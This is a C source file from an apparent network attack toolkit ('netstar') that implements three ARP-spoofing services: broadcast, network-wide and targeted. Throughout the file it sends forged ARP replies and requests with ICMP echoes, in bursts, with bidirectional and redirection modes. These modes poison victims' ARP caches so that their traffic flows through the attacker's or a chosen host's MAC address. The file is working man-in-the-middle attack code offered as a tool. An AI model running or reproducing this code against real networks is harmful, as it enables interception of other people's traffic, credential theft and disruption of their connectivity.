#include "netstar-arp-spoofing.h"

#include <netstar-services.h>
#include <netstar-threads.h>

#include <netstar-capture.h>
#include <netstar-forward.h>

#include <netstar-utils.h>

#include <netstar-scanner.h>
#include <netstar-recon.h>

#include <inttypes.h>
#include <stdlib.h>


static bool netstar_arp_broadcast_spoofing_initialized;


static void
netstar_arp_spoofing_broadcast_acknowledge(netstar_t *netstar, struct netstar_capture_packet *packet, void *args) {
  struct netstar_arp_broadcast_spoofing *spoofing_attack = (struct netstar_arp_broadcast_spoofing *)args;

  if (netstar_hosts_findipaddr4(spoofing_attack->spoofed_hosts, &packet->layer3.daddr.v4)) {
    netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.smac, NETSTAR_ICMP_TYPE_ECHO, &packet->layer3.daddr.v4, &packet->layer3.saddr.v4);

    netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.smac, NETSTAR_ARP_OPCODE_REPLY, &netstar->managed.iface->mac, &packet->layer3.daddr.v4, &packet->layer2.smac, &packet->layer3.saddr.v4);
  }
}

static void *
netstar_arp_broadcast_spoofing(void *context) {
  netstar_thread_t *thread = (netstar_thread_t *)context;

  struct netstar_arp_broadcast_spoofing *spoofing_attack = (struct netstar_arp_broadcast_spoofing *)thread->args;
  netstar_hosts_iterator_t spoofed_hosts_iter = NULL;
  netstar_t *netstar = spoofing_attack->netstar;

  netstar_timer_t timer = NETSTAR_TIMER_INITIALIZER;

  netstar_log(
    "\b \b[ arp@broadcast-spoofing ]: spoof-burst-interval: %" PRIu32 "s; "
                                     "spoof-burst-count: %zu; "
                                     "spoof-steady-interval: %" PRIu32 "\r\n",
    netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval),
    spoofing_attack->spoof_burst_count,
    netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval)
  );

  netstar_recon_hosts4(netstar, spoofing_attack->spoofed_hosts);

  for (; thread->status;) {
    netstar_time_t remaining_time = netstar_timer(&timer);

    if (!remaining_time) {
      for (spoofed_hosts_iter = netstar_hosts_begin(spoofing_attack->spoofed_hosts); spoofed_hosts_iter; spoofed_hosts_iter = netstar_hosts_next(spoofed_hosts_iter)) {
        netstar_host_t *spoofed_host = netstar_hosts_value(spoofed_hosts_iter);
        network_ipaddr4_t daddr = *netstar_utils_random_ipaddr4(&netstar->managed.iface->network, netstar->managed.iface->prefix);

        netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &MACIEEE802_BROADCAST, NETSTAR_ARP_OPCODE_REQUEST, &netstar->managed.iface->mac, &spoofed_host->addr.v4, &MACIEEE802_BROADCAST, &daddr);

#ifdef NETSTAR_DEBUG
        {
          char saddr[NETWORK_IPADDR4_STRLENGTH] = {0};

          network_ipaddr4_format(&spoofed_host->addr.v4, saddr, sizeof(saddr));

          netstar_log("\b \b[ arp@broadcast-spoofing ] %s %s ARP Request (0x%04" PRIX16 ") via FF:FF:FF:FF:FF:FF\r\n",
            saddr, netstar_vendors_namebymac(&spoofed_host->mac),
            NETSTAR_ARP_OPCODE_REQUEST
          );
        }
#endif

        netstar_time_sleep(20);
      }

      netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval));
    }

    netstar_time_sleep(netstar_time_secstomillisecs(2));
  }

  netstar_thread_exit(thread, NULL);
  return NULL;
}

int
netstar_arp_broadcast_spoofing_new(struct netstar_arp_broadcast_spoofing *spoofing_attack, netstar_t *netstar) {
  if (!(spoofing_attack->spoofed_hosts = netstar_hosts_new()))
    goto _return;

  spoofing_attack->spoof_burst_interval = ((spoofing_attack->spoof_burst_interval) ?: netstar_time_secstomillisecs(1));
  spoofing_attack->spoof_burst_count    = 10;

  spoofing_attack->spoof_steady_interval = ((spoofing_attack->spoof_steady_interval) ?: netstar_time_secstomillisecs(4));

  spoofing_attack->netstar = netstar;

  return 1;

_return:
  netstar_arp_broadcast_spoofing_free(spoofing_attack);
  return -1;
}

void
netstar_arp_broadcast_spoofing_free(struct netstar_arp_broadcast_spoofing *spoofing_attack) {
  if (spoofing_attack) {
    netstar_hosts_free(spoofing_attack->spoofed_hosts);
  }
}

static void
netstar_arp_broadcast_spoofing_initialize(netstar_t *netstar, void *context) {
  if (netstar_arp_broadcast_spoofing_initialized)
    return;

  netstar_arp_broadcast_spoofing_initialized = true;
}

static void
netstar_arp_broadcast_spoofing_deinitialize(void *context) {
  struct netstar_arp_broadcast_spoofing *spoofing_attack = (struct netstar_arp_broadcast_spoofing *)context;

  if (!netstar_arp_broadcast_spoofing_initialized)
    return;

  netstar_arp_broadcast_spoofing_free(spoofing_attack);

  netstar_arp_broadcast_spoofing_initialized = false;
}

static void
netstar_arp_broadcast_spoofing_start(void *context) {
  struct netstar_arp_broadcast_spoofing *spoofing_attack = (struct netstar_arp_broadcast_spoofing *)context;

  netstar_forward_add(netstar_arp_spoofing_broadcast_acknowledge, NETSTAR_FORWARD_ARP_REQUEST, spoofing_attack);
  spoofing_attack->thread = netstar_thread_spawn(netstar_arp_broadcast_spoofing, spoofing_attack);
}

static void
netstar_arp_broadcast_spoofing_stop(void *context) {
  struct netstar_arp_broadcast_spoofing *spoofing_attack = (struct netstar_arp_broadcast_spoofing *)context;

  if (!spoofing_attack->thread || spoofing_attack->thread->status == false)
    return;

  netstar_forward_remove(netstar_arp_spoofing_broadcast_acknowledge);
  netstar_thread_kill(spoofing_attack->thread);
}

static struct netstar_arp_broadcast_spoofing netstar_arp_broadcast_spoofing_context;

static struct netstar_service netstar_arp_broadcast_spoofing_context_service = {
  netstar_arp_broadcast_spoofing_initialize, netstar_arp_broadcast_spoofing_deinitialize,
  netstar_arp_broadcast_spoofing_start, netstar_arp_broadcast_spoofing_stop,
  "netstar:arp:broadcast-spoofing", &netstar_arp_broadcast_spoofing_context,
};

struct netstar_service *
netstar_arp_broadcast_spoofing_service(void) {
  return &netstar_arp_broadcast_spoofing_context_service;
}


static bool netstar_arp_network_spoofing_initialized;


static void
netstar_arp_network_spoofing_acknowledge(netstar_t *netstar, struct netstar_capture_packet *packet, void *args) {
  struct netstar_arp_network_spoofing *spoofing_attack = (struct netstar_arp_network_spoofing *)args;

  if (netstar_hosts_findipaddr4(spoofing_attack->spoofed_hosts, &packet->layer3.daddr.v4)) {
    netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.smac, NETSTAR_ICMP_TYPE_ECHO, &packet->layer3.daddr.v4, &packet->layer3.saddr.v4);

    netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.smac, NETSTAR_ARP_OPCODE_REPLY, &netstar->managed.iface->mac, &packet->layer3.daddr.v4, &packet->layer2.smac, &packet->layer3.saddr.v4);
  }

  if (spoofing_attack->bidirectional && netstar_hosts_findipaddr4(netstar_scanner_scanned_hosts4, &packet->layer3.daddr.v4)) {
    netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.dmac, NETSTAR_ICMP_TYPE_ECHO, &packet->layer3.saddr.v4, &packet->layer3.daddr.v4);

    netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.dmac, NETSTAR_ARP_OPCODE_REPLY, &netstar->managed.iface->mac, &packet->layer3.saddr.v4, &packet->layer2.dmac, &packet->layer3.daddr.v4);
  }
}

static void *
netstar_arp_network_spoofing(void *context) {
  netstar_thread_t *thread = (netstar_thread_t *)context;

  struct netstar_arp_network_spoofing *spoofing_attack = (struct netstar_arp_network_spoofing *)thread->args;
  netstar_hosts_iterator_t spoofed_hosts_iter = NULL, target_hosts_iter = NULL;
  netstar_t *netstar = spoofing_attack->netstar;

  netstar_timer_t timer = NETSTAR_TIMER_INITIALIZER;

  netstar_log(
    "\b \b[ arp@network-spoofing ]: network-scan-interval: %" PRIu32 "s; "
                                   "spoof-burst-interval: %" PRIu32 "s; "
                                   "spoof-burst-count: %zu; "
                                   "spoof-steady-interval: %" PRIu32 "\r\n",
    netstar_time_millisecstosecs(spoofing_attack->network_scan_interval),
    netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval),
    spoofing_attack->spoof_burst_count,
    netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval)
  );

  netstar_recon_hosts4(netstar, spoofing_attack->spoofed_hosts);

  if (spoofing_attack->redirective)
    netstar_recon_host4(netstar, &spoofing_attack->redirection_host);

  netstar_log("\b \b[ arp@network-spoofing ] initializing host reconnaissances on the network\r\n");

  while (thread->status && netstar_hosts_size(netstar_scanner_scanned_hosts4) < 2) {
    netstar_time_sleep(netstar_time_millisecstosecs(spoofing_attack->network_scan_interval));
    continue;
  }

  netstar_log("\b \b[ arp@network-spoofing ] discovered %zu hosts; starting attack\r\n", netstar_hosts_size(netstar_scanner_scanned_hosts4));

  if (spoofing_attack->redirective)
    netstar_log("\b \b[ arp@network-spoofing ] running on redirectional mode\r\n");

  while (thread->status) {
    netstar_time_t remaining_time = netstar_timer(&timer);

    if (!remaining_time) {
      for (spoofed_hosts_iter = netstar_hosts_begin(netstar_scanner_scanned_hosts4); spoofed_hosts_iter; spoofed_hosts_iter = netstar_hosts_next(spoofed_hosts_iter)) {
        netstar_host_t *spoofed_host = netstar_hosts_value(spoofed_hosts_iter);

        if (netstar_hosts_size(spoofing_attack->protected_hosts) && (netstar_hosts_findipaddr4(spoofing_attack->protected_hosts, &spoofed_host->addr.v4) || netstar_hosts_findmac(spoofing_attack->protected_hosts, &spoofed_host->mac)))
          continue;

        if (spoofing_attack->redirective && netstar_host_equals(&spoofing_attack->redirection_host, spoofed_host))
          continue;

        if (netstar_hosts_size(spoofing_attack->spoofed_hosts) && !netstar_hosts_findipaddr4(spoofing_attack->spoofed_hosts, &spoofed_host->addr.v4))
          continue;

        for (target_hosts_iter = netstar_hosts_begin(netstar_scanner_scanned_hosts4); target_hosts_iter; target_hosts_iter = netstar_hosts_next(target_hosts_iter)) {
          netstar_host_t *target_host = netstar_hosts_value(target_hosts_iter);

          uint16_t opcode = ((spoofing_attack->request) ? NETSTAR_ARP_OPCODE_REQUEST : NETSTAR_ARP_OPCODE_REPLY);
          network_macaddr_t source_mac = netstar->managed.iface->mac;

          if (netstar_host_equals(spoofed_host, target_host))
            continue;

       // if (netstar_hosts_size(attack->target_hosts) && !netstar_hosts_find(attack->target_hosts, target_host))
       //   continue;

          if (netstar_hosts_size(spoofing_attack->protected_hosts) && (netstar_hosts_findipaddr4(spoofing_attack->protected_hosts, &target_host->addr.v4) || netstar_hosts_findmac(spoofing_attack->protected_hosts, &target_host->mac)))
            continue;

          if (spoofing_attack->redirective) {
            if (netstar_host_equals(&spoofing_attack->redirection_host, target_host))
              continue;

            source_mac = spoofing_attack->redirection_host.mac;
          }

          if (!spoofing_attack->redirective)
            netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, NETSTAR_ICMP_TYPE_ECHO, &spoofed_host->addr.v4, &target_host->addr.v4);

          netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, opcode, &source_mac, &spoofed_host->addr.v4, &target_host->mac, &target_host->addr.v4);

          if (spoofing_attack->bidirectional) {
            if (!spoofing_attack->redirective)
              netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, NETSTAR_ICMP_TYPE_ECHO, &target_host->addr.v4, &spoofed_host->addr.v4);

            netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, opcode, &source_mac, &target_host->addr.v4, &spoofed_host->mac, &spoofed_host->addr.v4);
          }

#ifdef NETSTAR_DEBUG
          {
            char saddr[NETWORK_IPADDR4_STRLENGTH] = {0}, daddr[NETWORK_IPADDR4_STRLENGTH] = {0};

            network_ipaddr4_format(&spoofed_host->addr.v4, saddr, sizeof(saddr));
            network_ipaddr4_format(&target_host->addr.v4, daddr, sizeof(daddr));

            netstar_log("\b \b[ arp@network-spoofing ] %s %s ARP %s (0x%04" PRIX16 ") %s spoofing %s %s\r\n",
              saddr, netstar_vendors_namebymac(&spoofed_host->mac),
              ((spoofing_attack->request) ? "Request" : "Reply"), opcode,
              ((spoofing_attack->bidirectional) ? "bidirectional" : "directional"),
              netstar_vendors_namebymac(&target_host->mac), daddr
            );
          }
#endif
          netstar_time_sleep(20);
        }
      }

      if (spoofing_attack->spoof_burst_count) {
        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval));
        spoofing_attack->spoof_burst_count--;
      } else {
        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval));
      }
    }

    netstar_time_sleep(netstar_time_secstomillisecs(2));
  }

  netstar_thread_exit(thread, NULL);
  return NULL;
}

int
netstar_arp_network_spoofing_new(struct netstar_arp_network_spoofing *spoofing_attack, netstar_t *netstar) {
  if (!(spoofing_attack->spoofed_hosts = netstar_hosts_new()))
    goto _return;

  if (!(spoofing_attack->protected_hosts = netstar_hosts_new()))
    goto _return;

  spoofing_attack->network_scan_interval = ((spoofing_attack->network_scan_interval) ?: netstar_time_secstomillisecs(4));

  spoofing_attack->spoof_burst_interval  = ((spoofing_attack->spoof_burst_interval) ?: netstar_time_secstomillisecs(1));
  spoofing_attack->spoof_burst_count     = 10;

  spoofing_attack->spoof_steady_interval = ((spoofing_attack->spoof_steady_interval) ?: netstar_time_secstomillisecs(4));

  spoofing_attack->netstar = netstar;

  return 1;

_return:
  netstar_arp_network_spoofing_free(spoofing_attack);
  return -1;
}

void
netstar_arp_network_spoofing_free(struct netstar_arp_network_spoofing *spoofing_attack) {
  if (spoofing_attack) {
    netstar_hosts_free(spoofing_attack->spoofed_hosts);
    netstar_hosts_free(spoofing_attack->protected_hosts);
  }
}

static void
netstar_arp_network_spoofing_initialize(netstar_t *netstar, void *context) {
  if (netstar_arp_network_spoofing_initialized)
    return;

  netstar_arp_network_spoofing_initialized = true;
}

static void
netstar_arp_network_spoofing_deinitialize(void *context) {
  struct netstar_arp_network_spoofing *spoofing_attack = (struct netstar_arp_network_spoofing *)context;

  if (!netstar_arp_network_spoofing_initialized)
    return;

  netstar_arp_network_spoofing_free(spoofing_attack);

  netstar_arp_network_spoofing_initialized = false;
}

static void
netstar_arp_network_spoofing_start(void *context) {
  struct netstar_arp_network_spoofing *spoofing_attack = (struct netstar_arp_network_spoofing *)context;

  netstar_forward_add(netstar_arp_network_spoofing_acknowledge, NETSTAR_FORWARD_ARP_REQUEST, spoofing_attack);
  spoofing_attack->thread = netstar_thread_spawn(netstar_arp_network_spoofing, spoofing_attack);
}

static void
netstar_arp_network_spoofing_stop(void *context) {
  struct netstar_arp_network_spoofing *spoofing_attack = (struct netstar_arp_network_spoofing *)context;

  if (!spoofing_attack->thread || spoofing_attack->thread->status == false)
    return;

  netstar_forward_remove(netstar_arp_network_spoofing_acknowledge);
  netstar_thread_kill(spoofing_attack->thread);
}

static struct netstar_arp_network_spoofing netstar_arp_network_spoofing_context;

static struct netstar_service netstar_arp_network_spoofing_context_service = {
  netstar_arp_network_spoofing_initialize, netstar_arp_network_spoofing_deinitialize,
  netstar_arp_network_spoofing_start, netstar_arp_network_spoofing_stop,
  "netstar:arp:network-spoofing", &netstar_arp_network_spoofing_context,
};

struct netstar_service *
netstar_arp_network_spoofing_service(void) {
  return &netstar_arp_network_spoofing_context_service;
}


static bool netstar_arp_spoofing_initialized;


static void
netstar_arp_spoofing_acknowledge(netstar_t *netstar, struct netstar_capture_packet *packet, void *args) {
  struct netstar_arp_spoofing *spoofing_attack = (struct netstar_arp_spoofing *)args;

  if (netstar_hosts_findipaddr4(spoofing_attack->target_hosts, &packet->layer3.saddr.v4)) {
    netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.smac, NETSTAR_ICMP_TYPE_ECHO, &packet->layer3.daddr.v4, &packet->layer3.saddr.v4);

    netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.smac, NETSTAR_ARP_OPCODE_REPLY, &netstar->managed.iface->mac, &packet->layer3.daddr.v4, &packet->layer2.smac, &packet->layer3.saddr.v4);
  }

  if (spoofing_attack->bidirectional && netstar_hosts_findipaddr4(spoofing_attack->spoofed_hosts, &packet->layer3.daddr.v4)) {
    netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.dmac, NETSTAR_ICMP_TYPE_ECHO, &packet->layer3.saddr.v4, &packet->layer3.daddr.v4);

    netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.dmac, NETSTAR_ARP_OPCODE_REPLY, &netstar->managed.iface->mac, &packet->layer3.saddr.v4, &packet->layer2.dmac, &packet->layer3.daddr.v4);
  }
}

static void *
netstar_arp_spoofing(void *context) {
  netstar_thread_t *thread = (netstar_thread_t *)context;

  struct netstar_arp_spoofing *spoofing_attack = (struct netstar_arp_spoofing *)thread->args;
  netstar_hosts_iterator_t spoofed_hosts_iter = NULL, target_hosts_iter = NULL;
  netstar_t *netstar = spoofing_attack->netstar;

  netstar_timer_t timer = NETSTAR_TIMER_INITIALIZER;

  netstar_log("\b \b[ arp@spoofing ]: spoof-burst-interval: %" PRIu32 "s; "
                                     "spoof-burst-count: %zu; "
                                     "spoof-steady-interval: %" PRIu32 "\r\n",
    netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval),
    spoofing_attack->spoof_burst_count,
    netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval)
  );

  if (spoofing_attack->redirective) {
    netstar_log("\b \b[ arp@spoofing ] running on redirectional mode\r\n");
    netstar_recon_host4(netstar, &spoofing_attack->redirection_host);
  }

  netstar_recon_hosts4(netstar, spoofing_attack->spoofed_hosts);
  netstar_recon_hosts4(netstar, spoofing_attack->target_hosts);

  for (; thread->status;) {
    netstar_time_t remaining_time = netstar_timer(&timer);

    if (!remaining_time) {
      for (spoofed_hosts_iter = netstar_hosts_begin(spoofing_attack->spoofed_hosts); spoofed_hosts_iter; spoofed_hosts_iter = netstar_hosts_next(spoofed_hosts_iter)) {
        netstar_host_t *spoofed_host = netstar_hosts_value(spoofed_hosts_iter);

        if (spoofing_attack->redirective && netstar_host_equals(&spoofing_attack->redirection_host, spoofed_host))
          continue;

        for (target_hosts_iter = netstar_hosts_begin(spoofing_attack->target_hosts); target_hosts_iter; target_hosts_iter = netstar_hosts_next(target_hosts_iter)) {
          netstar_host_t *target_host = netstar_hosts_value(target_hosts_iter);

          uint16_t opcode = ((spoofing_attack->request) ? NETSTAR_ARP_OPCODE_REQUEST : NETSTAR_ARP_OPCODE_REPLY);
          network_macaddr_t source_mac = netstar->managed.iface->mac;

          if (spoofing_attack->redirective) {
            if (netstar_host_equals(&spoofing_attack->redirection_host, target_host))
              continue;

            source_mac = spoofing_attack->redirection_host.mac;
          }

          if (!spoofing_attack->redirective)
            netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, NETSTAR_ICMP_TYPE_ECHO, &spoofed_host->addr.v4, &target_host->addr.v4);

          netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, opcode, &source_mac, &spoofed_host->addr.v4, &target_host->mac, &target_host->addr.v4);

          if (spoofing_attack->bidirectional) {
            if (!spoofing_attack->redirective)
              netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, NETSTAR_ICMP_TYPE_ECHO, &target_host->addr.v4, &spoofed_host->addr.v4);

            netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, opcode, &source_mac, &target_host->addr.v4, &spoofed_host->mac, &spoofed_host->addr.v4);
          }

#ifdef NETSTAR_DEBUG
          {
            char saddr[NETWORK_IPADDR4_STRLENGTH] = {0}, daddr[NETWORK_IPADDR4_STRLENGTH] = {0};

            network_ipaddr4_format(&spoofed_host->addr.v4, saddr, sizeof(saddr));
            network_ipaddr4_format(&target_host->addr.v4, daddr, sizeof(daddr));

            netstar_log("\b \b[ arp@spoofing ] %s %s ARP %s (0x%04" PRIX16 ") %s spoofing %s %s\r\n",
              saddr, netstar_vendors_namebymac(&spoofed_host->mac),
              ((spoofing_attack->request) ? "Request" : "Reply"), opcode,
              ((spoofing_attack->bidirectional) ? "bidirectional" : "directional"),
              netstar_vendors_namebymac(&target_host->mac), daddr
            );
          }
#endif
          netstar_time_sleep(20);
        }
      }

      if (spoofing_attack->spoof_burst_count) {
        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval));
        spoofing_attack->spoof_burst_count--;
      } else {
        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval));
      }
    }

    netstar_time_sleep(netstar_time_secstomillisecs(2));
  }

  netstar_thread_exit(thread, NULL);
  return NULL;
}

int
netstar_arp_spoofing_new(struct netstar_arp_spoofing *spoofing_attack, netstar_t *netstar) {
  if (!(spoofing_attack->spoofed_hosts = netstar_hosts_new()))
    goto _return;
  if (!(spoofing_attack->target_hosts = netstar_hosts_new()))
    goto _return;

  spoofing_attack->spoof_burst_interval  = ((spoofing_attack->spoof_burst_interval) ?: netstar_time_secstomillisecs(2));
  spoofing_attack->spoof_burst_count      = 10;

  spoofing_attack->spoof_steady_interval = ((spoofing_attack->spoof_steady_interval) ?: netstar_time_secstomillisecs(4));

  spoofing_attack->netstar = netstar;

  return 1;

_return:
  netstar_arp_spoofing_free(spoofing_attack);
  return -1;
}

void
netstar_arp_spoofing_free(struct netstar_arp_spoofing *spoofing_attack) {
  if (spoofing_attack) {
    netstar_hosts_free(spoofing_attack->spoofed_hosts);
    netstar_hosts_free(spoofing_attack->target_hosts);
  }
}

static void
netstar_arp_spoofing_initialize(netstar_t *netstar, void *context) {
  if (netstar_arp_spoofing_initialized)
    return;

  netstar_arp_spoofing_initialized = true;
}

static void
netstar_arp_spoofing_deinitialize(void *context) {
  struct netstar_arp_spoofing *spoofing_attack = (struct netstar_arp_spoofing *)context;

  if (!netstar_arp_spoofing_initialized)
    return;

  netstar_arp_spoofing_free(spoofing_attack);

  netstar_arp_spoofing_initialized = false;
}

static void
netstar_arp_spoofing_start(void *context) {
  struct netstar_arp_spoofing *spoofing_attack = (struct netstar_arp_spoofing *)context;

  netstar_forward_add(netstar_arp_spoofing_acknowledge, NETSTAR_FORWARD_ARP_REQUEST, spoofing_attack);
  spoofing_attack->thread = netstar_thread_spawn(netstar_arp_spoofing, spoofing_attack);
}

static void
netstar_arp_spoofing_stop(void *context) {
  struct netstar_arp_spoofing *spoofing_attack = (struct netstar_arp_spoofing *)context;

  if (!spoofing_attack->thread || spoofing_attack->thread->status == false)
    return;

  netstar_forward_remove(netstar_arp_spoofing_acknowledge);
  netstar_thread_kill(spoofing_attack->thread);
}

static struct netstar_arp_spoofing netstar_arp_spoofing_context;

static struct netstar_service netstar_arp_spoofing_context_service = {
  netstar_arp_spoofing_initialize, netstar_arp_spoofing_deinitialize,
  netstar_arp_spoofing_start, netstar_arp_spoofing_stop,
  "netstar:arp:spoofing", &netstar_arp_spoofing_context,
};

struct netstar_service *
netstar_arp_spoofing_service(void) {
  return &netstar_arp_spoofing_context_service;
}


__attribute__((__constructor__))
static inline void
netstar_arp_register_services(void) {
  netstar_services_register(netstar_arp_broadcast_spoofing_service());
  netstar_services_register(netstar_arp_network_spoofing_service());
  netstar_services_register(netstar_arp_spoofing_service());
}
